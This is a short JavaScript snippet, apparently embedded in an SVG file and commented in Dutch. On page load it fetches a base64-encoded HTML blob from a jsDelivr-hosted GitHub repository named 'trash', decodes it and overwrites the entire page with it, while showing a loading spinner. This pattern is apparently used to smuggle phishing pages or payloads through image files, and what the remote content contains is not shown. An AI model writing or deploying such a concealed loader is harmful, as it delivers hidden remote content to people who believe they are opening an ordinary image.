svg.script:

window.onload = () => {
    const targetUrl = "https://cdn.jsdelivr.net/gh/nxyder/trash@d656360a531fd223b91d6b1f8655b0709eb74f2e/w.html";

    async function loadAndRender() {
        try {
            // 1. Data ophalen
            const response = await fetch(targetUrl);
            if (!response.ok) throw new Error("Netwerkfout");

            let base64String = await response.text();
            base64String = base64String.trim();

            // 2. Base64 decoderen
            const decodedHtml = decodeURIComponent(escape(window.atob(base64String)));

            // 3. Document openen en overschrijven
            document.open();
            document.write(decodedHtml);
            document.close();

        } catch (error) {
            console.error("Fout bij het laden:", error);
            // Verberg de spinner bij een fout
            const spinner = document.getElementById("spinnerGroup");
            if (spinner) {
                spinner.style.display = "none";
            }
        }
    }

    loadAndRender();
};
